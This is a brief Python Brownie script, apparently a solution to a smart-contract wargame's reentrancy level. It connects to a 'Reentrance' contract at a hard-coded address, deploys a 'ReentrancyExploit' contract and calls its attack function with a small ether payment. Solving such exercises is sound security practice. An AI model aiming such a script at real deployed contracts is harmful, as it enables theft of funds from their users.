from brownie import config, accounts, Reentrance, ReentrancyExploit

InstanceAddress = "0x26DA6176f7f6c0F64eC8Bd1bBe9F78C29946De62"

player = accounts.add(config["wallets"]["from_key"]) 

reentrance = Reentrance.at(InstanceAddress)

def main():
    reentrancyExploit = ReentrancyExploit.deploy(InstanceAddress, {"from": player})
    reentrancyExploit.atk({"from": player, "value": 1000000000000000})

